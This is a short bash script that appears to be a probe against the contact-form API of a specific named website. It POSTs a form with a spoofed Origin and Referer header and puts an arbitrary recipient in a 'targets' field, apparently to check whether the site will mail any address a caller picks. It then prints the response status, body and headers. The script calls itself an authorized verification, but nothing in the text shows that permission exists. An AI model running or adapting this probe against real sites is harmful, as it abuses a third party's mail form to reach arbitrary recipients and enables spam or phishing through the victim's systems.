#!/bin/bash
# Independent verification probe: POST /api/send with my own UA and payload.
# $1 = recipient value for "targets"  ($2 = label)
H="https://www.infinitycapital.bh"
UA="IndependentVerifier/1.0 (security assessment)"
OUT=$(mktemp); HDR=$(mktemp)
CODE=$(curl -s -m 45 -o "$OUT" -D "$HDR" -w "%{http_code}" -X POST "$H/api/send" \
  -H "User-Agent: $UA" \
  -H "Origin: https://www.infinitycapital.bh" \
  -H "Referer: https://www.infinitycapital.bh/contact" \
  -F "fname=Security" -F "lname=Verification" -F "areacode=+973" -F "tel=00000000" \
  -F "cname=Independent Audit" -F "subject=Authorized security verification" \
  -F "msg=Automated authorized security verification. Please disregard." \
  -F "check=" -F "targets=$1")
echo "== recipient=[$2] http=$CODE"
echo "-- body (first 300 bytes):"; head -c 300 "$OUT"; echo
echo "-- relevant headers:"; grep -iE "^(HTTP/|content-type|server|x-vercel-mitigated|x-vercel-id|location)" "$HDR" | tr -d '\r'
echo
rm -f "$OUT" "$HDR"
